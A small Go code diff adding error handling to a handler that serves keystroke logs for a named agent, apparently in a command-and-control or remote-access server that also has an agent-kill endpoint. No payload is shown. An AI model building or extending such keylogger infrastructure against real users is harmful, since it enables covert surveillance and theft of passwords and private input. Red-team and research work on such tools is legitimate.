@@ -190,7 +190,17 @@ func KillAgentHandler(c *gin.Context) {
 
 func GetKeylogHandler(c *gin.Context) {
 	agentParam := c.Param("agt")
-	keylogs := data.Keylog(agentParam)
+
+	keylogs, err := data.GetKeylogs(agentParam)
+	if err != nil {
+		logger.Logf(logger.Error, "GetKeylogs failed for %s: %v", agentParam, err)
+
+		c.JSON(http.StatusInternalServerError, gin.H{
+			"error": "failed to fetch logs",
+		})
+		return
+	}
+
 	c.JSON(http.StatusOK, gin.H{"data": keylogs})
 }
 
